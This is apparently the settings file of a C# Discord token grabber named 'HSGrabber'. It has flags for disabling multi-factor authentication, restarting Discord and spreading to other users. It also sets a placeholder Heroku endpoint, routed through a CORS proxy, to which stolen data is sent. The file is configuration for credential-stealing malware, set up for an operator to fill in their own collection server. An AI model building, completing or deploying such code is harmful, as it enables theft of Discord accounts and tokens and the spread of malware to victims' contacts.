using System;

namespace HSGrabber
{
	internal class Settings
	{
		public static bool disableMfa = false;

		public static bool restartDiscord = true;

		public static bool spread = true;

		private static string serverurl = "https://your-app-name.herokuapp.com/api/v1/send";

		public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl;
	}
}
